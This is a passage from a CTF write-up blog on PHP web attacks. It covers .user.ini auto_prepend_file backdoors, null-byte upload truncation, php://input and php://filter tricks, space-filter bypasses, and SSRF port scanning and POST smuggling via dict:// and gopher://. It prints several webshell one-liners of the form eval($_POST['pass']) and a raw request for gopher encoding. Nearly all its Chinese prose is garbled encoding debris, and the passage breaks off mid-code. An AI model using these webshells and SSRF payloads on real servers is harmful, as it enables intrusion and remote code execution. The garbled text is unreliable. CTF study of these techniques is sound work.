¹ç›®å½•ä¹‹å¤–ï¼Œåˆ™åªæ‰«æè¯¥ç›®å½•ã€‚åœ¨ <code>.user.ini</code> é£æ ¼çš„ ini æ–‡ä»¶ä¸­åªæœ‰å…·æœ‰ PHP_INI_PERDIR å’Œ PHP_INI_USER æ¨¡å¼çš„ ini è®¾ç½®å¯è¢«è¯†åˆ«</p><p><img src="https://wooyun.js.org/images_result/images/2014103002272568560.png"></p><p><code>.user.ini</code>å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå¯ä»¥ç”±ç”¨æˆ·â€œè‡ªå®šä¹‰â€çš„php.iniï¼Œæˆ‘ä»¬èƒ½å¤Ÿè‡ªå®šä¹‰çš„è®¾ç½®æ˜¯æ¨¡å¼ä¸ºâ€œPHP_INI_PERDIR ã€ PHP_INI_USERâ€çš„è®¾ç½®ã€‚ï¼ˆä¸Šé¢è¡¨æ ¼ä¸­æ²¡æœ‰æåˆ°çš„PHP_INI_PERDIRä¹Ÿå¯ä»¥åœ¨.user.iniä¸­è®¾ç½®ï¼‰</p><p>å®é™…ä¸Šï¼Œé™¤äº†<code>PHP_INI_SYSTEM</code>ä»¥å¤–çš„æ¨¡å¼ï¼ˆåŒ…æ‹¬PHP_INI_ALLï¼‰éƒ½æ˜¯å¯ä»¥é€šè¿‡.user.iniæ¥è®¾ç½®çš„</p><p>è€Œä¸”ï¼Œå’Œ<code>php.ini</code>ä¸åŒçš„æ˜¯ï¼Œ<code>.user.ini</code>æ˜¯ä¸€ä¸ªèƒ½è¢«åŠ¨æ€åŠ è½½çš„iniæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä¿®æ”¹äº†<code>.user.ini</code>åï¼Œä¸éœ€è¦é‡å¯æœåŠ¡å™¨ä¸­é—´ä»¶ï¼Œåªéœ€è¦ç­‰å¾…<code>user_ini.cache_ttl</code>æ‰€è®¾ç½®çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º300ç§’ï¼‰ï¼Œå³å¯è¢«é‡æ–°åŠ è½½ï¼Œç„¶åæˆ‘ä»¬çœ‹åˆ°php.iniä¸­çš„é…ç½®é¡¹ï¼Œä½†æ˜¯åªè¦ç¨å¾®æ•æ„Ÿçš„é…ç½®é¡¹ï¼Œéƒ½æ˜¯<code>PHP_INI_SYSTEM</code>æ¨¡å¼çš„ï¼ˆç”šè‡³æ˜¯php.ini onlyçš„ï¼‰ï¼ŒåŒ…æ‹¬<code>disable_functions</code>ã€<code>extension_dir</code>ã€<code>enable_dl</code>ç­‰ã€‚ ä¸è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°å€ŸåŠ©<code>.user.ini</code>æ–‡ä»¶æ¥æ„é€ ä¸€ä¸ªâ€œåé—¨â€ï¼Œå…¶ä¸­æœ‰ä¸¤ä¸ªå¯ä»¥åˆ©ç”¨çš„é…ç½®ç‚¹</p><p>auto_append_fileå’Œauto_prepend_file</p><p>å‰è€…æ˜¯æ–‡ä»¶åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶åï¼Œåè€…æ˜¯è‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰</p><p>åœ¨.user.iniå†™å…¥</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">auto_prepend_file=xxx.jpg<span class="hljs-regexp">/png/gi</span>f<br></code></pre></td></tr></table></figure><p>ç„¶åä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯å›¾ç‰‡é©¬</p><p>buuä¸€é“é¢˜ä¸ºä¾‹ buu suctf CheckIn</p><p>ä¸Šä¼ .user.iniåä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ æŠ“åŒ…æ”¹åŒ…</p><p>æ­¤é¢˜æ£€æµ‹<code>&lt;?</code>éœ€è¦å¯¹ä¸€å¥è¯è¿›è¡Œå˜å½¢å…·ä½“è§ä¸€å¥è¯çš„å˜å½¢</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210606161438091.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210606161521279.png"></p><p><strong>00æˆªæ–­</strong><br>0x00æ˜¯å­—ç¬¦ä¸²çš„ç»“æŸæ ‡è¯†ç¬¦ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰‹åŠ¨æ·»åŠ å­—ç¬¦ä¸²æ ‡è¯†ç¬¦çš„æ–¹å¼æ¥å°†åé¢çš„å†…å®¹è¿›è¡Œæˆªæ–­ï¼Œè€Œåé¢çš„å†…å®¹åˆå¯ä»¥å¸®åŠ©æˆ‘ä»¬ç»•è¿‡æ£€æµ‹ã€‚%00å’Œ0x00,åå°è¯»å–æ˜¯é‡åˆ°%00å°±ä¼šåœæ­¢ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œurlä¸­è¾“å…¥çš„æ˜¯upload/post.php%00.jpgï¼Œé‚£ä¹ˆåå°è¯»å–åˆ°æ˜¯upload/post.phpï¼Œå°±å®ç°äº†ç»•åç›®çš„ã€‚<br>00æˆªæ–­çš„é™åˆ¶æ¡ä»¶ï¼šPHP&lt;5.3.29ï¼Œä¸”GPCå…³é—­<br><strong>æ³¨æ„ï¼š00æˆªæ–­æ˜¯åœ¨urlçš„åœ°æ–¹å®ç°çš„</strong></p><p><img src="https://img-blog.csdnimg.cn/2021022323070732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>ä¼ å›¾ç‰‡é©¬ burpæŠ“åŒ… æ”¹poståé¢çš„url<br><img src="https://img-blog.csdnimg.cn/20210223232427937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>èšå‰‘è¿æ¥æ—¶æ³¨æ„ä¿®æ”¹url</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p><strong>php://input</strong><br>åˆ©ç”¨phpä¼ªåè®® <a href="https://segmentfault.com/a/1190000018991087">æ»šå»çœ‹å•¦:PHPä¼ªåè®®æ€»ç»“</a><br><img src="https://img-blog.csdnimg.cn/20210302113044978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>åœ¨hackbarå†…å†™<code>/?php://input</code>åPOSTä¼ å‚<code>&lt;?php system(&#39;&#39;);?&gt;</code>å¾—åˆ°flag<br><strong>è¿œç¨‹åŒ…å«</strong><br>æ­¤é¢˜ä¹Ÿå¯ä»¥åˆ©ç”¨ä¼ªåè®®è§£å¼€ ä½†æ­¤é¢˜è€ƒæŸ¥çš„æ˜¯ä¸ªäººvpsçš„åˆ©ç”¨ å¾…è¡¥<br><strong>è¯»å–æºä»£ç </strong><br>åˆ©ç”¨ä¼ªåè®®ä¸­çš„<code>php://filter</code><br>æ„é€ url<code>/?php://filter/read=convert.base64-encode/resource=/flag</code></p><p>å…³äºphpä¸€å¥è¯ï¼š<br>å¦‚æœåœ¨æµè§ˆå™¨ä¼ å‚ï¼Œä½¿ç”¨â€â€åŒ…è£¹phpä¸€å¥è¯ï¼Œå¹¶ä¸”echo &gt;*.phpçš„æ–¹å¼å†™å…¥æ—¶æ—¶ï¼Œåˆ™éœ€è¦æ³¨æ„å¯¹$çš„è½¬ä¹‰ï¼Œé¿å…æ­¤ç±»æƒ…å†µçš„å‘ç”Ÿï¼Œå»ºè®®ä½¿ç”¨â€™â€™â€åŒ…è£¹ä¸€å¥è¯</p><p>åœ¨windowsä¸‹åˆ©ç”¨cmdçš„echo &gt;*.php éœ€è¦å¯¹å°–æ‹¬å·è¿›è¡Œè½¬ä¹‰ï¼ˆä¸å¿…åŠ å¼•å·åŒ…è£¹ï¼‰ï¼Œå³ï¼š<br><code>^&lt;?php @eval($_POST[&#39;pass&#39;]);?^&gt;</code></p><p>åœ¨linuxä¸‹echo &gt;*.phpï¼š<br><code>&quot;&lt;?php @eval(\$_POST[&#39;pass&#39;]);?&gt;&quot;</code><br><code>&quot;&lt;?php @eval(\$_POST[\&quot;pass\&quot;]);?&gt;&quot;</code><br><code>&#39;&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;&#39;</code><br><code>&#39;&lt;?php @eval($_POST[\&#39;pass\&#39;]);?&gt;&#39;</code></p><h2 id="ç©ºæ ¼è¿‡æ»¤ç»•è¿‡"><a href="#ç©ºæ ¼è¿‡æ»¤ç»•è¿‡" class="headerlink" title="ç©ºæ ¼è¿‡æ»¤ç»•è¿‡"></a>ç©ºæ ¼è¿‡æ»¤ç»•è¿‡</h2><p><code>$&#123;IFS&#125;</code><br><code>$IFS$9</code><br><code>&lt;</code><br><code>&lt;&gt;</code><br><code>&#123;,&#125;</code><br>ç­‰å¯ä»¥ä»£æ›¿ç©ºæ ¼<br>æ­¤é¢˜æ³¨é‡Šæ‰äº†ç­”æ¡ˆè€Œä¸å›æ˜¾ ç©ºæ ¼ç»•è¿‡åæŸ¥çœ‹é¡µé¢æºç å³å¯</p><h2 id="ç»¼åˆç»•è¿‡"><a href="#ç»¼åˆç»•è¿‡" class="headerlink" title="ç»¼åˆç»•è¿‡"></a>ç»¼åˆç»•è¿‡</h2><p>åˆ©ç”¨ç¼–ç è¡¨æ‰“å‡ºç»„åˆæ‹³<br><img src="https://img-blog.csdnimg.cn/20210313110431187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="ä¼ªåè®®è¯»å–æ–‡ä»¶"><a href="#ä¼ªåè®®è¯»å–æ–‡ä»¶" class="headerlink" title="ä¼ªåè®®è¯»å–æ–‡ä»¶"></a>ä¼ªåè®®è¯»å–æ–‡ä»¶</h2><p>è¯»å–Webç›®å½•ä¸‹çš„flag.php è€ƒäº†ä¸ªå¸¸è¯†ï¼Œwebç›®å½•åœ¨ï¼š<code>var/www/html</code><br>ç›´æ¥ç”¨è¯»å–æ–‡ä»¶çš„ä¼ªåè®®:<code>file:///var/www/html</code></p><h2 id="åœ¨çº¿æ‰«æç«¯å£"><a href="#åœ¨çº¿æ‰«æç«¯å£" class="headerlink" title="åœ¨çº¿æ‰«æç«¯å£"></a>åœ¨çº¿æ‰«æç«¯å£</h2><p>è¿™é‡Œç†Ÿæ‚‰ä¸€ä¸ªåè®®ï¼š<br>dictåè®®(2628)ï¼š<a href="http://www.dict.orgæ˜¯ä¸€ä¸ªçº¿ä¸Šçš„å­—å…¸æŸ¥è¯¢ç½‘ç«™(çœŸå°±æŸ¥å•è¯çš„)/">www.dict.orgæ˜¯ä¸€ä¸ªçº¿ä¸Šçš„å­—å…¸æŸ¥è¯¢ç½‘ç«™(çœŸå°±æŸ¥å•è¯çš„)</a> èƒ½æƒ³åˆ°ç”¨è¿™ä¸ªåè®®æ¥æ¢æµ‹ç«¯å£çš„ä¹Ÿæ˜¯äººæ‰<br>åŸç†ï¼šï¼ˆå¾…è¡¥ï¼‰<br>å¯ä»¥åœ¨å‘½ä»¤è¡Œé‡Œè¿æ¥ç©ä¸€ä¸‹ telnet ip 2628<br>help æŸ¥çœ‹å¸®åŠ©<br>define * (è¦æŸ¥è¯¢çš„å•è¯)<br><img src="https://img-blog.csdnimg.cn/20210313170807589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>å¥½äº† è¿™æ˜¯å®˜æ–¹æ–‡æ¡£ä¸­dict://è¯­æ³•</p><p><img src="https://img-blog.csdnimg.cn/20210313170835224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>é¦–å…ˆåœ¨åœ°å€æ æ„é€ <code>?url=dict://127.0.0.1:8000</code><br>ç”±äºdict://åè®®æ˜¯ä¸€æ¡ä¸€æ¡æ‰§è¡Œçš„ éœ€è¦è®©æµè§ˆå™¨é€ä¸ªè®¿é—®8<del>9Kçš„ç«¯å£<br>ä»å­—å…¸çˆ†ç ´çš„è§’åº¦è€ƒè™‘ï¼Œé‚£ä¹ˆæŠ“åŒ…ï¼Œæ”¾åˆ°intruderï¼Œå°†ç«¯å£æ ‡è®°ï¼Œçˆ†ç ´æ¨¡å¼é€‰æ‹©numberï¼Œè®¾ç½®8</del>9Kçš„èŒƒå›´ï¼Œçˆ†ç ´å®Œæ¯•ï¼Œå€’å™æŸ¥çœ‹é•¿åº¦ï¼Œpayloadä¸º8057ï¼Œå›åˆ°æµè§ˆå™¨è®¿é—®è¯¥ç«¯å£å³å¯<br><img src="https://img-blog.csdnimg.cn/20210313171505715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210313171540971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210313171710798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70">æ’ä¸€å¥ï¼Œä¹Ÿå¯ä»¥ç›´æ¥è®¿é—®127.0.0.1åŠ ç«¯å£å†æŒ‚burpçˆ†ç ´</p><p><img src="https://img-blog.csdnimg.cn/20210314180743119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></p><h2 id="POSTè¯·æ±‚"><a href="#POSTè¯·æ±‚" class="headerlink" title="POSTè¯·æ±‚"></a>POSTè¯·æ±‚</h2><p>è¿™é‡Œçš„é¢˜ç›®å¼€å§‹éš¾åº¦è·¨è¶Šå¾ˆå‰å®³äº† å¾—å»å­¦ä¹ ä¸€äº›æ¶‰åŠåˆ°çš„åè®®äº†</p><p>é¦–å…ˆï¼Œä»€ä¹ˆæ˜¯<code>gopheråè®®</code><img src="https://img-blog.csdnimg.cn/20210320203305300.png"></p><blockquote><p>Gopheræ˜¯Internetä¸Šä¸€ä¸ªéå¸¸æœ‰åçš„ä¿¡æ¯æŸ¥æ‰¾ç³»ç»Ÿï¼Œç”±æ˜å°¼è‹è¾¾å¤§å­¦è®¾è®¡ï¼Œå¹¶ä»¥è¯¥æ ¡çš„è¿åŠ¨é˜Ÿâ€œé‡‘è‰²åœ°é¼ â€ï¼ˆä¿šè¯­ï¼šâ€œå»æ‰¾â€ï¼‰æ¥å‘½åã€‚åœ¨æ—¶é—´ä¸Šï¼Œæ¯”Internetè¿˜è¦æ—©å‡ å¹´ã€‚å®ƒåªæ”¯æŒæ–‡æœ¬ï¼Œä¸æ”¯æŒå›¾åƒã€‚è¯¥åè®®å°†Internetä¸Šçš„æ–‡ä»¶ç»„ç»‡æˆæŸç§ç´¢å¼•ï¼Œæ–¹ä¾¿ç”¨æˆ·ä»Internetçš„ä¸€å¤„å¸¦åˆ°å¦ä¸€å¤„ã€‚å…è®¸ç”¨æˆ·ä½¿ç”¨å±‚å ç»“æ„çš„èœå•ä¸æ–‡ä»¶ï¼Œä»¥å‘ç°å’Œæ£€ç´¢ä¿¡æ¯ï¼ŒGopherå®¢æˆ·ç¨‹åºå’ŒGopheræœåŠ¡å™¨ç›¸è¿æ¥ï¼Œå¹¶èƒ½ä½¿ç”¨èœå•ç»“æ„æ˜¾ç¤ºå…¶å®ƒçš„èœå•ã€æ–‡æ¡£æˆ–æ–‡ä»¶ï¼Œå¹¶ç´¢å¼•ã€‚åŒæ—¶å¯é€šè¿‡Telnetè¿œç¨‹è®¿é—®å…¶å®ƒåº”ç”¨ç¨‹åºã€‚Gopheråè®®ä½¿å¾—Internetä¸Šçš„æ‰€æœ‰Gopherå®¢æˆ·ç¨‹åºï¼Œèƒ½å¤Ÿä¸Internetä¸Šçš„æ‰€æœ‰å·²â€œæ³¨å†Œâ€çš„GopheræœåŠ¡å™¨è¿›è¡Œå¯¹è¯ã€‚<br>Gopheråè®®å¯ä»¥æ”»å‡»å†…ç½‘çš„ FTPã€Telnetã€Redisã€Memcacheï¼Œä¹Ÿå¯ä»¥è¿›è¡Œ GETã€POST è¯·æ±‚ï¼šgopheråè®®æ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼Œå…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­ä¸€ä¸ªæœ€å¼ºå¤§çš„åè®®ï¼ˆä¿—ç§°ä¸‡èƒ½åè®®ï¼‰<br>åœ¨WWWå‡ºç°åï¼ŒGopherå¤±å»äº†æ˜”æ—¥çš„è¾‰ç…Œã€‚ç°åœ¨å®ƒåŸºæœ¬è¿‡æ—¶ï¼Œäººä»¬å¾ˆå°‘å†ä½¿ç”¨å®ƒ</p></blockquote><p><strong><code>gopheråè®®æ²¡æœ‰é»˜è®¤ç«¯å£ï¼Œæ‰€ä»¥éœ€è¦æŒ‡å®šwebç«¯å£ï¼Œè€Œä¸”éœ€è¦æŒ‡å®šPOSTæ–¹æ³•ã€‚å›è½¦æ¢è¡Œä½¿ç”¨%0D%0Aæ›¿æ¢%0A,POSTå‚æ•°ä¹‹é—´çš„&amp;åˆ†éš”ç¬¦ä¹Ÿè¦è¿›è¡Œurlç¼–ï¿½ ï¿½</code></strong></p><p>å› æ­¤ ä¸ºäº†ä½¿ç”¨gopheråè®®è¿›è¡Œæ”»å‡» å°±å¿…é¡»å°†<code>&amp;</code>è¿›è¡Œurlç¼–ç ï¼ˆç¬¬ä¸€æ¬¡ï¼‰ è€Œgopheråè®®å°†ä¸Šé¢ç¬¬ä¸€æ¬¡çš„å­—ç¬¦ä¸²ä¼ è¿›æœåŠ¡å™¨æ—¶ urlè§£ç ï¼ˆä¸€æ¬¡ï¼‰ æ­¤æ—¶åˆä¼šå‡ºç°å­—ç¬¦<code>&amp;</code> è€Œæ­¤æ—¶çš„urlé‡Œgopherå¹¶ä¸è®¤å¯å³å°†ç»§ç»­è·³è½¬çš„åœ°å€ï¼ˆå«æœ‰æœªè½¬ç çš„&amp;ï¼‰ å› æ­¤æˆ‘ä»¬è¦è®©ç¬¬ä¸€æ¬¡çš„<code>&amp;</code>è½¬ç <code>%26</code>å†æ¬¡è½¬ç ä¸º<code>%2526</code> æœ€åéœ€è¦å°†ä¸Šé¢çš„å†…å®¹è£…è¿›gopheråè®®é‡Œ æ‰€ä»¥è¿›è¡Œæœ€åä¸€æ¬¡è½¬ç  æ”¾è¿›urlé‡Œ</p><p><a href="https://blog.csdn.net/qq_41107295/article/details/103026470">ssrfå¯¹gopheråè®®çš„åˆ©ç”¨</a></p><ul><li>åšé¢˜æ­¥éª¤</li></ul><p>dirsearch -&gt; åˆ©ç”¨phpä¼ªåè®®file://è®¿é—®ä¸€ä¸‹ å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    header(<span class="hljs-string">&quot;Location: /?url=_&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$ch</span> = curl_init();<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);<br>curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//flag.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] != <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just View From 127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-variable">$flag</span>=getenv(<span class="hljs-string">&quot;CTFHUB&quot;</span>);<br><span class="hljs-variable">$key</span> = md5(<span class="hljs-variable">$flag</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key&quot;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;key&quot;</span>] == <span class="hljs-variable">$key</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;form action=<span class="hljs-string">&quot;/flag.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>&lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;key&quot;</span>&gt;<br>&lt;!-- Debug: key=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>;<span class="hljs-meta">?&gt;</span>--&gt;<br>&lt;/form&gt;<br><br><span class="hljs-comment">//è¦æ±‚è®¿é—®çš„è¿œç¨‹åœ°å€å¿…é¡»ä¸º127.0.0.1(ç›¸å½“äºå®æˆ˜ä¸­å¿…é¡»è®©è¿œç¨‹ç›®æ ‡ä¸»æœºæœ¬åœ°è®¿é—®)</span><br></code></pre></td></tr></table></figure><p>å‰ç«¯è®¿é—®ä¸€ä¸‹flag.phpï¼ŒæŸ¥çœ‹æºç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/flag.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;key&quot;</span> /&gt;</span><br>  <span class="hljs-comment">&lt;!-- De<span class="hljs-doctag">bug:</span> key=399be68d73e23ae8f326b4850128f33c--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç”¨postçš„æ–¹å¼æŠŠkeyä¼ è¿›flag.php -&gt; æ„é€ å¸¦keyçš„POSTåŒ… æŠ“åŒ…é‡æ”¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">POST /flag.php HTTP/1.1<br>Host: 127.0.0.1<br>User-Agent: curl<br>Accept: */*<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 36<br><br>key=---<br>#æ³¨æ„æ­¤å¤„çš„Content-Lengthè¦ä¸POSTå†…å®¹é•¿åº¦ä¸€è‡´<br>#ä¸Šé¢çš„æ•´ä¸ªPOSTåŒ…è¿›è¡Œurlç¼–ç <br>#å°†å¾—åˆ°çš„ç¼–ç ä¸­çš„æ‰€æœ‰%0A(æ•°å­—0) æ›¿æ¢ä¸º%0D%0A (%0Aä¸ºæ¢è¡Œç¬¦â€”â€”å¦èµ·ä¸€æ–°è¡Œï¼Œå…‰æ ‡åœ¨æ–°è¡Œçš„å¼€å¤´ï¼›%0Dä¸ºå›è½¦â€”â€”å…‰æ ‡å›åˆ°æ—§è¡Œ(å…‰æ ‡å½“å‰æ‰€åœ¨çš„è¡Œ)çš„å¼€å¤´<br>#å†å°†ä¸Šé¢å¾—åˆ°çš„ç¼–ç å†ä¸€æ¬¡ç¼–ç ï¼<br></code></pre></td></tr></table></figure><p>å°†ä¸Šé¢å¾—åˆ°çš„æ‹¼æ¥<strong>gopheråè®®</strong>é‡æ”¾å³å¯ <img src="https://img-blog.csdnimg.cn/20210314175949642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br><a href="https://blog.csdn.net/weixin_46203060/article/details/109548606?spm=1001.2014.3001.5501">wpå‚è€ƒåšå®¢</a></p><h2 id="æ–‡ä»¶ä¸Šä¼ -SSRF"><a href="#æ–‡ä»¶ä¸Šä¼ -SSRF" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ (SSRF)"></a>æ–‡ä»¶ä¸Šä¼ (SSRF)</h2><p>åŒä¸Šä¸€é¢˜æŸ¥çœ‹åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    header(<span class="hljs-string">&quot;Location: /?url=_&quot;</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$ch</span> = curl_init();<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);<br>curl_exec(<span class="hljs-variable">$ch</span>);<br>curl_close(<span class="hljs-variable">$ch</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//flag.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>] != <span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just View From 127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span 